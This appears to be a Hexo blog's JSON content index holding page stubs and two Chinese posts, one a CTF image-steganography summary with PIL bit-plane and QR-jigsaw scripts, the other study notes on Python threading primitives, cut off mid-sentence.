{"meta":{"title":"雨过天晴&伞落人离's Blog","subtitle":"","description":"","author":"雨过天晴&伞落人离","url":"https://zwh-china.github.io","root":"/"},"pages":[{"title":"about","date":"2018-12-12T14:14:36.000Z","updated":"2021-04-24T07:12:06.027Z","comments":false,"path":"about/index.html","permalink":"https://zwh-china.github.io/about/index.html","excerpt":"","text":"[さくら荘のzwh] 与&nbsp; Mashiro&nbsp; （ 真（ま）白（しろ） ） 对话中... bot_ui_ini()"},{"title":"client","date":"2018-12-20T15:13:35.000Z","updated":"2021-04-23T04:41:16.348Z","comments":false,"path":"client/index.html","permalink":"https://zwh-china.github.io/client/index.html","excerpt":"","text":"直接下载 or 扫码下载："},{"title":"bangumi","date":"2019-02-10T13:32:48.000Z","updated":"2020-03-16T10:41:30.000Z","comments":false,"path":"bangumi/index.html","permalink":"https://zwh-china.github.io/bangumi/index.html","excerpt":"","text":""},{"title":"comment","date":"2018-12-20T15:13:48.000Z","updated":"2021-04-23T04:41:05.385Z","comments":true,"path":"comment/index.html","permalink":"https://zwh-china.github.io/comment/index.html","excerpt":"","text":"念两句诗 叙别梦、扬州一觉。 【宋代】吴文英《夜游宫·人去西楼雁杳》"},{"title":"donate","date":"2018-12-20T15:13:05.000Z","updated":"2021-05-02T18:59:25.748Z","comments":false,"path":"donate/index.html","permalink":"https://zwh-china.github.io/donate/index.html","excerpt":"","text":"","author":"雨过天晴"},{"title":"lab","date":"2019-01-05T13:47:59.000Z","updated":"2020-03-16T10:41:30.000Z","comments":false,"path":"lab/index.html","permalink":"https://zwh-china.github.io/lab/index.html","excerpt":"","text":"sakura主题balabala"},{"title":"links","date":"2018-12-19T15:11:06.000Z","updated":"2021-04-23T04:43:40.759Z","comments":true,"path":"links/index.html","permalink":"https://zwh-china.github.io/links/index.html","excerpt":"","text":""},{"title":"music","date":"2018-12-20T15:14:28.000Z","updated":"2021-04-23T04:45:52.435Z","comments":false,"path":"music/index.html","permalink":"https://zwh-china.github.io/music/index.html","excerpt":"","text":""},{"title":"rss","date":"2018-12-20T15:09:03.000Z","updated":"2020-03-16T10:41:30.000Z","comments":true,"path":"rss/index.html","permalink":"https://zwh-china.github.io/rss/index.html","excerpt":"","text":""},{"title":"tags","date":"2018-12-12T14:14:16.000Z","updated":"2020-03-16T10:41:30.000Z","comments":true,"path":"tags/index.html","permalink":"https://zwh-china.github.io/tags/index.html","excerpt":"","text":""},{"title":"theme-sakura","date":"2019-01-04T14:53:25.000Z","updated":"2020-03-16T10:41:30.000Z","comments":false,"path":"theme-sakura/index.html","permalink":"https://zwh-china.github.io/theme-sakura/index.html","excerpt":"","text":"Hexo主题Sakura修改自WordPress主题Sakura，感谢原作者Mashiro"},{"title":"video","date":"2018-12-20T15:14:38.000Z","updated":"2020-03-16T10:41:30.000Z","comments":false,"path":"video/index.html","permalink":"https://zwh-china.github.io/video/index.html","excerpt":"","text":"var videos = [ { img: 'https://lain.bgm.tv/pic/cover/l/0e/1e/218971_2y351.jpg', title: '朝花夕誓——于离别之朝束起约定之花', status: '已追完', progress: 100, jp: 'さよならの朝に約束の花をかざろう', time: '放送时间: 2018-02-24 SUN.', desc: ' 住在远离尘嚣的土地，一边将每天的事情编织成名为希比欧的布，一边静静生活的伊欧夫人民。在15岁左右外表就停止成长，拥有数百年寿命的他们，被称为“离别的一族”，并被视为活着的传说。没有双亲的伊欧夫少女玛奇亚，过着被伙伴包围的平稳日子，却总感觉“孤身一人”。他们的这种日常，一瞬间就崩溃消失。追求伊欧夫的长寿之血，梅萨蒂军乘坐着名为雷纳特的古代兽发动了进攻。在绝望与混乱之中，伊欧夫的第一美女蕾莉亚被梅萨蒂带走，而玛奇亚暗恋的少年克里姆也失踪了。玛奇亚虽然总算逃脱了，却失去了伙伴和归去之地……。' }, { img : 'https://lain.bgm.tv/pic/cover/l/0e/1e/218971_2y351.jpg', title: '朝花夕誓——于离别之朝束起约定之花', status: '已追完', progress: 100, jp: 'さよならの朝に約束の花をかざろう', time: '2018-02-24 SUN.', desc: ' 住在远离尘嚣的土地，一边将每天的事情编织成名为希比欧的布，一边静静生活的伊欧夫人民。在15岁左右外表就停止成长，拥有数百年寿命的他们，被称为“离别的一族”，并被视为活着的传说。没有双亲的伊欧夫少女玛奇亚，过着被伙伴包围的平稳日子，却总感觉“孤身一人”。他们的这种日常，一瞬间就崩溃消失。追求伊欧夫的长寿之血，梅萨蒂军乘坐着名为雷纳特的古代兽发动了进攻。在绝望与混乱之中，伊欧夫的第一美女蕾莉亚被梅萨蒂带走，而玛奇亚暗恋的少年克里姆也失踪了。玛奇亚虽然总算逃脱了，却失去了伙伴和归去之地……。' } ] .should-ellipsis{overflow:hidden;text-overflow:ellipsis;white-space:nowrap;width:95%;}.should-ellipsis-full{overflow:hidden;text-overflow:ellipsis;white-space:nowrap;width:100%;}.should-ellipsis i{position:absolute;right:24px;}.grey-text{color:#9e9e9e !important}.grey-text.text-darken-4{color:#212121 !important}html{line-height:1.15;-ms-text-size-adjust:100%;-webkit-text-size-adjust:100%}body{margin:0}img{border-style:none}progress{display:inline-block;vertical-align:baseline}::-webkit-file-upload-button{-webkit-appearance:button;font:inherit}html{-webkit-box-sizing:border-box;box-sizing:border-box}*,*:before,*:after{-webkit-box-sizing:inherit;box-sizing:inherit}ul:not(.browser-default){padding-left:0;list-style-type:none}ul:not(.browser-default)>li{list-style-type:none}.card{-webkit-box-shadow:0 2px 2px 0 rgba(0,0,0,0.14),0 3px 1px -2px rgba(0,0,0,0.12),0 1px 5px 0 rgba(0,0,0,0.2);box-shadow:0 2px 2px 0 rgba(0,0,0,0.14),0 3px 1px -2px rgba(0,0,0,0.12),0 1px 5px 0 rgba(0,0,0,0.2)}.hoverable{-webkit-transition:-webkit-box-shadow .25s;transition:-webkit-box-shadow .25s;transition:box-shadow .25s;transition:box-shadow .25s,-webkit-box-shadow .25s}.hoverable:hover{-webkit-box-shadow:0 8px 17px 0 rgba(0,0,0,0.2),0 6px 20px 0 rgba(0,0,0,0.19);box-shadow:0 8px 17px 0 rgba(0,0,0,0.2),0 6px 20px 0 rgba(0,0,0,0.19)}i{line-height:inherit}i.right{float:right;margin-left:15px}.bangumi .right{float:right !important}.material-icons{text-rendering:optimizeLegibility;-webkit-font-feature-settings:'liga';-moz-font-feature-settings:'liga';font-feature-settings:'liga'}.row{margin-left:auto;margin-right:auto;margin-bottom:20px}.row:after{content:\"\";display:table;clear:both}.row .col{float:left;-webkit-box-sizing:border-box;box-sizing:border-box;padding:0 .75rem;min-height:1px}.row .col.s12{width:100%;margin-left:auto;left:auto;right:auto}@media only screen and (min-width:601px){.row .col.m6{width:50%;margin-left:auto;left:auto;right:auto}}html{line-height:1.5;font-family:-apple-system,BlinkMacSystemFont,\"Segoe UI\",Roboto,Oxygen-Sans,Ubuntu,Cantarell,\"Helvetica Neue\",sans-serif;font-weight:normal;color:rgba(0,0,0,0.87)}@media only screen and (min-width:0){html{font-size:14px}}@media only screen and (min-width:992px){html{font-size:14.5px}}@media only screen and (min-width:1200px){html{font-size:15px}}.card{position:relative;margin:.5rem 0 1rem 0;background-color:#fff;-webkit-transition:-webkit-box-shadow .25s;transition:-webkit-box-shadow .25s;transition:box-shadow .25s;transition:box-shadow .25s,-webkit-box-shadow .25s;border-radius:2px}.card .card-title{font-size:24px;font-weight:300}.card .card-title.activator{cursor:pointer}.card .card-image{position:relative}.card .card-image img{display:block;border-radius:2px 2px 0 0;position:relative;left:0;right:0;top:0;bottom:0;width:100%}.card .card-content{padding:24px;border-radius:0 0 2px 2px}.card .card-content p{margin:0}.card .card-content .card-title{display:block;line-height:32px;margin-bottom:8px}.card .card-content .card-title i{line-height:32px}.card .card-reveal{padding:24px;position:absolute;background-color:#fff;width:100%;overflow-y:auto;left:0;top:100%;height:100%;z-index:3;display:none}.card .card-reveal .card-title{cursor:pointer;display:block}.waves-effect{position:relative;cursor:pointer;display:inline-block;overflow:hidden;-webkit-user-select:none;-moz-user-select:none;-ms-user-select:none;user-select:none;-webkit-tap-highlight-color:transparent;vertical-align:middle;z-index:1;-webkit-transition:.3s ease-out;transition:.3s ease-out}.waves-effect img{position:relative;z-index:-1}.waves-block{display:block}::-webkit-input-placeholder{color:#d1d1d1}::-moz-placeholder{color:#d1d1d1}:-ms-input-placeholder{color:#d1d1d1}::-ms-input-placeholder{color:#d1d1d1}[type=\"radio\"]:not(:checked){position:absolute;opacity:0;pointer-events:none}[type=\"radio\"]:not(:checked)+span{position:relative;padding-left:35px;cursor:pointer;display:inline-block;height:25px;line-height:25px;font-size:1rem;-webkit-transition:.28s ease;transition:.28s ease;-webkit-user-select:none;-moz-user-select:none;-ms-user-select:none;user-select:none}[type=\"radio\"]:not(:checked)+span:before,[type=\"radio\"]:not(:checked)+span:after{border-radius:50%}[type=\"radio\"]:not(:checked)+span:before,[type=\"radio\"]:not(:checked)+span:after{border:2px solid #5a5a5a}[type=\"radio\"]:not(:checked)+span:after{-webkit-transform:scale(0);transform:scale(0)}[type=\"checkbox\"]:not(:checked){position:absolute;opacity:0;pointer-events:none}[type=\"checkbox\"]:not(:checked):disabled+span:not(.lever):before{border:none;background-color:rgba(0,0,0,0.42)}[type=\"checkbox\"].filled-in:not(:checked)+span:not(.lever):before{width:0;height:0;border:3px solid transparent;left:6px;top:10px;-webkit-transform:rotateZ(37deg);transform:rotateZ(37deg);-webkit-transform-origin:100% 100%;transform-origin:100% 100%}[type=\"checkbox\"].filled-in:not(:checked)+span:not(.lever):after{height:20px;width:20px;background-color:transparent;border:2px solid #5a5a5a;top:0px;z-index:0}input[type=checkbox]:not(:disabled) ~ .lever:active:before,input[type=checkbox]:not(:disabled).tabbed:focus ~ .lever::before{-webkit-transform:scale(2.4);transform:scale(2.4);background-color:rgba(0,0,0,0.08)}input[type=range].focused:focus:not(.active)::-webkit-slider-thumb{-webkit-box-shadow:0 0 0 10px rgba(38,166,154,0.26);box-shadow:0 0 0 10px rgba(38,166,154,0.26)}input[type=range].focused:focus:not(.active)::-moz-range-thumb{box-shadow:0 0 0 10px rgba(38,166,154,0.26)}input[type=range].focused:focus:not(.active)::-ms-thumb{box-shadow:0 0 0 10px rgba(38,166,154,0.26)} 番组计划 这里将是永远的回忆 window.onload = function(){ videos.forEach(function(video, i){ $('#rootRow').append(` ${video.title} ${video.jp} ${video.status} ${video.title} ${video.jp} 放送时间: ${video.time} ${video.desc} ${video.status} `) }) }"}],"posts":[{"title":"图片隐写总结","slug":"图片隐写","date":"2021-05-20T13:30:07.363Z","updated":"2021-05-20T13:34:49.780Z","comments":true,"path":"2021/05/20/图片隐写/","link":"","permalink":"https://zwh-china.github.io/2021/05/20/%E5%9B%BE%E7%89%87%E9%9A%90%E5%86%99/","excerpt":"","text":"CTF 图片隐写总结最近CTF遇到不少隐写题，总结来说一般就是先是几大步骤。binwalk，zsteg，stegsolve一把梭。先看binwalk能不能提取一些有意思的隐藏文件，然后提取出来。zsteg其实对于隐写来说很强，它可以一把梭LSB,MSB。StegSolve可以直接提取出plan图。具体我也用Python照着教程复现了一下其功能。顺手学习Python PIL库，和基本图片原理。 from PIL import Image import glob, os import sys import multiprocessing import time def get_plane(img, channel, index=0): print(&#39;run&#39;) color_mode = channel offset = index if channel in img.mode: new_image = Image.new(&#39;1&#39;, img.size) new_image_data = new_image.load() img_data = img.load() channel_index = img.mode.index(channel) for x in range(img.size[0]): for y in range(img.size[1]): color = img_data[x, y] channel = color[channel_index] plane = bin(channel)[2:].zfill(8) try: new_image_data[x, y] = 255 * int(plane[abs(index - 7)]) except IndexError: pass new_image.save(f&#39;&#123;color_mode&#125;-&#123;offset&#125;.png&#39;) return new_image if __name__ == &#39;__main__&#39;: file = input(&#39;输入图片名称: &#39;) imag = Image.open(file) for channel in imag.mode: for plane in range(8): t=multiprocessing.Process(target=get_plane,args=(imag, channel, plane),daemon=True) t.start() temp=input(&#39;...&#39;) temp=input(&#39;...&#39;) 其步骤就是，打开图片，然后将其进行模式分离。一般来说图片都采取RGB(A)形式存储。通过使用PIL内置的方法可以实现分离读取。总的来说PIL和cv一样，对图片数据进行操作都是使用一个二维数组，二维数组可以近似看作图片(x,y)坐标对应的像素，其为RGB三个值组成的元组。再通过下标选取，即可实现提取某一通道的效果。 再看一道题，四川省省赛的WP misc 上来三件套，那自然是 B通道Plane为0时得到这么多的二维码。扫描其中一个二维码得到整数。再结合原图不难想到解题思路就是按照二维码扫描出的数值进行复位拼接。主要就是两个问题，二维码和原图的分割，二维码的扫描和图片的复位这里参考下别人的WP from PIL import Image import numpy import pyzbar.pyzbar as pyzbar # 打开图片 raw = Image.open(&#39;./Jigsaw1.png&#39;) print(&quot;Image size: &quot;, raw.size) # 打印碎片图大小 # 获取LSB隐写图像 _, _, blue = raw.split() lsb = Image.eval(blue, lambda p: 255 if p&amp;1 else 0) lsb.show() # 单独获取每个小块 pice_size = numpy.array(raw.size)//100 # 因为二维码每行100个 pice_size=tuple(pice_size) print(&quot;Pice size: &quot;, pice_size) # 打印每个二维码大小 # 还原图像 fixed = Image.new(raw.mode, raw.size) def getValue(code): value = &quot;&quot; for data in code: value = data.data.decode(&#39;utf-8&#39;) return value for x in range(100): for y in range(100): pice = Image.new(raw.mode, pice_size) # 新建一个色彩通道和大小均与单个二维码相同的空白图片作为复位的底板图 pos = numpy.array([x, y])*pice.size # 标记出二维码坐标 pice.paste(lsb, (-pos[0], -pos[1])) # 把二维码提取出来粘上去 tmp=pice.resize((550,550),Image.ANTIALIAS) # Image.ANTIALIAS抗锯齿 调整大小 code =(pyzbar.decode(tmp)) value=(int(getValue(code))) pice.paste(raw, (-pos[0], -pos[1])) # 把碎块图放到白板上覆盖二维码 fixed.paste(pice, (value%100*pice.size[0], value//100*pice.size[1])) # 移到填补画布 fixed.show() print(x, &quot;%&quot;) fixed.save(&quot;result.png&quot;) 照着原理优化了一下 from PIL import Image import numpy as np import pyzbar.pyzbar as pyzbar import threading import time lock = threading.Lock() def scan(img): data = pyzbar.decode(img) for data in data: return data.data.decode(&#39;utf-8&#39;) # img = Image.open(&#39;./B-0.png&#39;) # default_img = Image.open(&#39;./2.png&#39;) # tinkered_img = Image.new(mode=default_img.mode, size=default_img.size) # print(img.size) # qr_size = tuple(np.array(img.size) // 100) # print(qr_size) tinkered_img = Image.new(mode=&#39;RGB&#39;, size=(2700, 2700)) def solve(start: int, end: int): global tinkered_img img = Image.open(&#39;./B-0.png&#39;) default_img = Image.open(&#39;./2.png&#39;) qr_size = tuple(np.array(img.size) // 100) for y in range(start, end): for x in range(100): print(f&#39;(&#123;x&#125;,&#123;y&#125;)&#39;) box = (qr_size[0] * x, qr_size[1] * y, qr_size[0] * (x + 1), qr_size[1] * (y + 1)) temp = img.crop(box) puzzle = default_img.crop(box) temp = temp.resize((550, 550), Image.ANTIALIAS) # 经测试 27x27大小图片手机可以扫出来但是pyzbar读不出来故重新调整大小后扫描 # temp.show() info = int(scan(temp)) print(info) row = (info // 100) * qr_size[0] # 行坐标 column = (info % 100) * qr_size[1] # 列坐标 dig_row = ((info // 100) + 1) * qr_size[0] dig_column = ((info % 100) + 1) * qr_size[1] paste_box = (column,row , dig_column,dig_row) with lock: tinkered_img.paste(puzzle, paste_box) with lock: tinkered_img.show() t = threading.Thread(target=solve, args=(0, 25)) t.start() t1 = threading.Thread(target=solve, args=(25, 50)) t1.start() t2 = threading.Thread(target=solve, args=(50, 75)) t2.start() t3 = threading.Thread(target=solve, args=(75, 100)) t3.start() t.join() t1.join() t2.join() t3.join() 值得注意的是，paste函数可以传一个tuple即可，不需要指出全部四个参量。还有就是二维码扫描对图片大小可能有一定要求，扫描前最好resize。在Image的坐标是笛卡尔坐标系，以(0,0)起始。","categories":[{"name":"CTF学习","slug":"CTF学习","permalink":"https://zwh-china.github.io/categories/CTF%E5%AD%A6%E4%B9%A0/"}],"tags":[]},{"title":"python并行2","slug":"python并行2","date":"2021-05-14T12:56:29.000Z","updated":"2021-05-14T12:39:58.523Z","comments":true,"path":"2021/05/14/python并行2/","link":"","permalink":"https://zwh-china.github.io/2021/05/14/python%E5%B9%B6%E8%A1%8C2/","excerpt":"","text":"2-1 什么是线程博客之前有篇文章浅显的讲了一下线程是啥，可以参考往期。这里不做过多赘述。线程由三个元素组成：程序计数器、寄存器和堆栈。与相同进程中的其他线程共享的资源基本上包括数据和操作系统资源。另外线程有自己的执行状态也就是线程状态，而且可以和其他线程同步。 线程状态可以是就绪，运行和阻塞。 创建一个线程，他会进入就绪状态（ ready） 由操作系统（或者有运行时支持系统）调度一个线程执行而且轮到它执行时，它开始执行并进入运行状态（running） 线程在等待一个条件时会进入阻塞状态（blocked）例如去等一个锁。当阻塞条件中止，阻塞线程就会返回到就绪状态 多线程编程的优点主要在性能，在上下文切换上进程切换更耗时。 2-2 Python Threading模块详见https://docs.python.org/3/library/threading.html 2-3 定义一个线程有手就行（略略略） 2-4 确定当前线程使用参数标识和命名线程是很麻烦的。在Thread实例化（创建）的时候可以设置，不设置就是默认值。Tip.对于服务器进程（包含多个线程），对线程命名时比较必要的 2-4-1 具体函数threading提供了currentThread().getName()方法来返回线程名 2-5 定义线程子类经常会继承threading模块的Thread类来进行继承和重写。官方文档说了只能重写___init__和run方法 举个例子 from threading import Thread class ThreadNew(Thread): def __init__(self,name): self.name = name def run(self): print(f&#39;My name is &#123;self.name&#125;&#39;) 这个基本原理就是继承了Thread类的init参数，但是我自己又定义了额外参数。线程从ready-&gt;running状态改变时。实际上就是历经里我们这个自定义类的___init__和run方法。 2-5-1 关于Thread.start()和Thread.join()start方法是不阻塞的，假如你把一堆线程start完了，再挨个去join。那么线程执行running顺序可能是不一样的，明明你第一个start的线程可能并不是第一个跑起来的。至于join方法 官方是这么说的 join(timeout=None) Wait until the thread terminates. This blocks the calling thread until the thread whose joinmethod is called terminates – either normally or through an unhandled exception – or until the optional timeout occurs. 说白了，假如我希望我的线程被顺序执行，就是start一个先让他执行完再去执行下一步。 2-6 使用锁（Lock）的线程同步threading提供了一个简单的锁机制，允许在线程间实现同步。 lock=threading.Lock() lock.acquire() # 返回真如果拿到锁，基本都会拿到，因为拿不到也会去阻塞等待 但也不一定，你如果设置了非阻塞或者timeout就可能返回false 如果没获取成功 acquire(blocking=True,timeout=-1) # 默认-1就是never 这种锁的一个简单应用就是，让线程能够顺序执行在重写的Thread类中的run方法中开头加一个lock.acquire()这样后来start的就会因为锁被占用阻塞而等待。等run方法结束时再lock.release()让下一个继续run。只能保证在锁的区间保持一致，如果在run方法结束前就释放锁，那么这些进程尽管启动是顺序启动，但是结束就不会是挨个结束了。 2-7 重入锁（RLock）重入锁是一个同步原语（synchronization primitives）听起来有点高大上，百度百科真的拉跨搜都搜不到这个东西。在国外StackOverFlow找到解释 Synchronization primitives are simple software mechanisms provided by a platform (e.g. operating system) to its users for the purposes of supporting thread or process synchronization. They&#39;re usually built using lower level mechanisms (e.g. atomic operations, memory barriers, spinlocks, context switches etc). Mutex, event, conditional variables and semaphores are all synchronization primitives. So are shared and exclusive locks. Monitor is generally considered a high-level synchronization tool. It&#39;s an object which guarantees mutual exclusion for its methods using other synchronization primitives (usually exclusive locks with condition variables to support waiting and signaling). In some contexts when monitor is used as a building block it is also considered a synchronization primitive. Critical section is not a synchronization primitive. It&#39;s a part of an execution path that must be protected from concurrent execution in order to maintain some invariants. You need to use some synchronization primitives to protect critical section. 首先吧，同步原语是一种由平台提供的软件机制，用来干嘛的？用来同步进程和线程。他们通常是由更加底层的机制构建的(例如原子操作，内存屏障，旋转锁，上下文切换等) 互斥锁，事件，条件变量和信号量都是同步原语。同时共享和排斥锁也是的。Monitor（不知道咋翻译）通常被认为是一种更高层面的同步工具。。。。（后面还不太懂，先不管了） P.S.这书写的其实还不算太友好，Python语法倒是讲的很细，对于Python初学者能看懂。但是对于这种并行概念和原理背景能再介绍的详细点就好了 。 看下官网的介绍： A reentrant lock is a synchronization primitive that may be acquired multiple times by the same thread. Internally, it uses the concepts of “owning thread” and “recursion level” in addition to the locked/unlocked state used by primitive locks. In the locked state, some thread owns the lock; in the unlocked state, no thread owns it. To lock the lock, a thread calls its acquire() method; this returns once the thread owns the lock. To unlock the lock, a thread calls its release() method. acquire()/release() call pairs may be nested; only the final release() (the release() of the outermost pair) resets the lock to unlocked and allows another thread blocked in acquire() to proceed. 对比于threading里的Lock不难看出它的主要特点是可以被同一线程多次获取，但也需要多次解锁。同时重入锁还有个特点就是只能由获取锁的线程来释放，而普通的Lock则可以由任意线程释放 看到这里其实我还是觉得这玩意和Lock没啥区别，直到我看了书上的例程 import threading import time import random class Box: def __init__(self): self.lock = threading.RLock() self.total_items = 0 def execute(self, value): with self.lock: self.total_items += value def add(self): with self.lock: self.execute(1) def remove(self): with self.lock: self.execute(-1) def adder(box, items): print(&quot;N° &#123;&#125; items to ADD \\n&quot;.format(items)) while items: box.add() time.sleep(1) items -= 1 print(&quot;ADDED one item --&gt;&#123;&#125; item to ADD \\n&quot;.format(items)) def remover(box, items): print(&quot;N° &#123;&#125; items to REMOVE \\n&quot;.format(items)) while items: box.remove() time.sleep(1) items -= 1 print(&quot;REMOVED one item --&gt;&#123;&#125; item to REMOVE \\n&quot;.format(items)) def main(): box = Box() t1 = threading.Thread(target=adder, \\ args=(box, random.randint(10,20))) t2 = threading.Thread(target=remover, \\ args=(box, random.randint(1,10))) t1.start() t2.start() t1.join() t2.join() if __name__ == &quot;__main__&quot;: main() 来分析一下实例化了一个Box类，这个类里有物品数量默认是0，物品数量的增减通过内部add和remove方法控制，这俩方法间接调用execute来对实例变量item进行操作。这里开了两个线程一个是加10-20，另一个是减1-10。在每次加减时，先回把方法给锁住，就是说假如我开始加了，那么减方法就会一直被锁，每次执行增减时也会获取一个锁。增减完再一步步释放。 2-8 信号量（semaphore）信号量是一个由操作系统管理的抽象数据类型，用来同步多个线程对共享资源和数据的访问。信号量包括一个内部变量，会标识对关联资源的并发访问数。 具体使用 semaphore = threading.Semaphore(0) # 初始化信号量内部计数 默认是1 将其初始值设为0得到信号量事件 semaphore.acquire() # 内部计数减1 semaphore.release() # 内部计数加1 The acquire()method blocks if necessary until it can return without making the counter negative. If not given, value defaults to 1.也就是当计数器为0时必须先被release才能再require 举个实际的例子吧（抄的python doc的样例我觉得很有代表性） Semaphores are often used to guard resources with limited capacity, for example, a database server. In any situation where the size of the resource is fixed, you should use a bounded semaphore. Before spawning any worker threads, your main thread would initialize the semaphore: maxconnections = 5 # ... pool_sema = BoundedSemaphore(value=maxconnections) Once spawned, worker threads call the semaphore’s acquire and release methods when they need to connect to the server: with pool_sema: conn = connectdb() try: # ... use connection ... finally: conn.close() The use of a bounded semaphore reduces the chance that a programming error which causes the semaphore to be released more than it’s acquired will go undetected. 就是控制数据库的最大链接量 这里是用的Bounded Semaphore,其实还是换汤不换药。 class threading.``BoundedSemaphore(value=1) Class implementing bounded semaphore objects. A bounded semaphore checks to make sure its current value doesn’t exceed its initial value. If it does, ValueError is raised. In most situations semaphores are used to guard resources with limited capacity. If the semaphore is released too many times it’s a sign of a bug. If not given, value defaults to 1. Changed in version 3.3: changed from a factory function to a class. 说白了就是加了个内部检测机制，当信号量计数器的值始终不会超过其初始值。（其实你用的正确也不会有这种情况）但是因为默认的Semaphore是没法直观看到计数器值，所以用这个Bounded Semaphore可以避免一些意料外的错误。 信号量还有种特殊用法就是互斥锁。互斥锁就是内部变量初始化为1的一个信号量（最好是BoundedSemaphore），可以实现对数据和资源的互斥访问。 信号量在多线程编程语言中仍很常用但有俩主要问题 释放操作数要与等待操作上相同 可能遇到死锁情况 2.9 使用条件的线程同步使用条件来进行线程同步的原理，类似于socket通信。当一个线程调用condition.wait()来进行阻塞，当另一个线程发出condition.notify()或者是condition.notify_all()另一个原本阻塞的线程便会继续运行。同时condition在初始化时如果没有传入锁，那么会默认创建一个RLock。当一个线程对共享的状态数据有依赖时，往往就会用condition来进行同步。如果这个状态被另一个线程改变，并调用notify，那么他就会继续运行并检测是否状态是ideal的。这个过程可以这样表示 status=&#39;sleep&#39; def consumer(): with condition: if status!=&#39;ideal&#39;: condition.wait() consumer() else: print(&#39;Success&#39;) def produce(): with condition: status=&#39;ideal&#39; condition.notify() 同时由于with存在，所以说在notify后在wait的线程后不会立刻被唤醒。这是因为调用notify的线程还没有释放锁。待其线程执行完毕，锁被释放，等待的线程才会继续运行。 同时此处的状态检查也可以使用条件变量的condition.wait_for()来进行状态检测 2.10 使用事件的线程同步事件是用于线程间通信的一个对象。一个线程等待一个信号，另一个线程输出这个信号，进本来说event对象管理的一个内部标志，这个可以用clear()设置为false，用set()设置为True，还可用is_set()测试 线程可以通过wait()方法等待一个信号，用set()方法发送信号。这个比较简单直接看doc This is one of the simplest mechanisms for communication between threads: one thread signals an event and other threads wait for it. An event object manages an internal flag that can be set to true with the set() method and reset to false with the clear() method. The wait() method blocks until the flag is true. class threading.Event Class implementing event objects. An event manages a flag that can be set to true with the set() method and reset to false with the clear() method. The wait() method blocks until the flag is true. The flag is initially false. Changed in version 3.3: changed from a factory function to a class. is_set() Return True if and only if the internal flag is true. set() Set the internal flag to true. All threads waiting for it to become true are awakened. Threads that call wait() once the flag is true will not block at all. clear() Reset the internal flag to false. Subsequently, threads calling wait() will block until set() is called to set the internal flag to true again. wait(timeout=None) Block until the internal flag is true. If the internal flag is true on entry, return immediately. Otherwise, block until another thread calls set() to set the flag to true, or until the optional timeout occurs. When the timeout argument is present and not None, it should be a floating point number specifying a timeout for the operation in seconds (or fractions thereof). This method returns True if and only if the internal flag has been set to true, either before the wait call or after the wait starts, so it will always return True except if a timeout is given and the operation times out. 2.11 使用屏障的事件同步有时，一个应用可以划分为多个阶段，其规则是：如果一个进程的所有线程没有全部完成他们的任务，进程就不能继续。屏障（Barrier）实现了这一概念：如果一个线程完成了它的阶段，会调用一个屏障原语并停止。涉及的所有线程都完成其执行阶段而且都调用了同步原语时，系统将他们全部解锁并进入下一阶段。 看下官方文档 This class provides a simple synchronization primitive for use by a fixed number of threads that need to wait for each other. Each of the threads tries to pass the barrier by calling the wait() method and will block until all of the threads have made their wait() calls. At this point, the threads are released simultaneously. The barrier can be reused any number of times for the same number of threads. As an example, here is a simple way to synchronize a client and server thread: b = Barrier(2, timeout=5) def server(): start_server() b.wait() while True: connection = accept_connection() process_server_connection(connection) def client(): b.wait() while True: connection = make_connection() process_client_connection(connection) class threading.Barrier(parties, action=None, timeout=None) Create a barrier object for parties number of threads. An action, when provided, is a callable to be called by one of the threads when they are released. timeout is the default timeout value if none is specified for the wait() method. wait(timeout=None) Pass the barrier. When all the threads party to the barrier have called this function, they are all released simultaneously. If a timeout is provided, it is used in preference to any that was supplied to the class constructor. The return value is an integer in the range 0 to parties – 1, different for each thread. This can be used to select a thread to do some special housekeeping, e.g.: i = barrier.wait() if i == 0: # Only one thread needs to print this print(&quot;passed the barrier&quot;) If an action was provided to the constructor, one of the threads will have called it prior to being released. Should this call raise an error, the barrier is put into the broken state. If the call times out, the barrier is put into the broken state. This method may raise a BrokenBarrierError exception if the barrier is broken or reset while a thread is waiting. reset() Return the barrier to the default, empty state. Any threads waiting on it will receive the BrokenBarrierError exception. Note that using this function may require some external synchronization if there are other threads whose state is unknown. If a barrier is broken it may be better to just leave it and create a new one. abort() Put the barrier into a broken state. This causes any active or future calls to wait() to fail with the BrokenBarrierError. Use this for example if one of the threads needs to abort, to avoid deadlocking the application. It may be preferable to simply create the barrier with a sensible timeout value to automatically guard against one of the threads going awry. parties The number of threads required to pass the barrier. n_waiting The number of threads currently waiting in the barrier. broken A boolean that is True if the barrier is in the broken state. exception threading.BrokenBarrierError This exception, a subclass of RuntimeError, is raised when the Barrier object is reset or broken. 官方样例代码就是保证服务端启动，客户端才能继续接下来的动作。再看下书上的代码。 from random import randrange from threading import Barrier, Thread from time import ctime, sleep num_runners = 3 finish_line = Barrier(num_runners) runners = [&#39;Huey&#39;, &#39;Dewey&#39;, &#39;Louie&#39;] def runner(): name = runners.pop() sleep(randrange(2, 5)) print(&#39;%s reached the barrier at: %s \\n&#39; % (name, ctime())) finish_line.wait() def main(): threads = [] print(&#39;START RACE!!!!&#39;) for i in range(num_runners): threads.append(Thread(target=runner)) threads[-1].start() for thread in threads: thread.join() print(&#39;Race over!&#39;) if __name__ == &quot;__main__&quot;: main() 启动了三个线程，代表三个赛跑者。他们依次到达终点后，都进入等待状态，直到等待数为选手数，表明都到了终点，main函数从阻塞中恢复，打印比赛结束 2-12 使用队列的线程通讯线程需要共享数据和资源时，多线程可能很复杂。幸运的是threading模块提供了很多的同步原语 包括信号量、条件变量、事件和锁。 不过使用queue模块被认为是一个最可行的办法。实际上处理队列要容易得多，这使得多线程编程更加安全，因为它会有效的将对一个资源的所有访问排队，实现一种更简介、可读的设计模式。 我们只需要考虑如下队列方法： put():在队列中放入一个元素。 get():从队列删除并返回一个元素。 task_done():每次处理一个元素时需要调用这个方法 join():阻塞，直到所有元素都被处理 The queue module implements multi-producer, multi-consumer queues. It is especially useful in threaded programming when information must be exchanged safely between multiple threads. The Queue class in this module implements all the required locking semantics. The module implements three types of queue, which differ only in the order in which the entries are retrieved. In a FIFO queue, the first tasks added are the first retrieved. In a LIFO queue, the most recently added entry is the first retrieved (operating like a stack). With a priority queue, the entries are kept sorted (using the heapq module) and the lowest valued entry is retrieved first. Internally, those three types of queues use locks to temporarily block competing threads; however, they are not designed to handle reentrancy within a thread. In addition, the module implements a “simple” FIFO queue type, SimpleQueue, whose specific implementation provides additional guarantees in exchange for the smaller 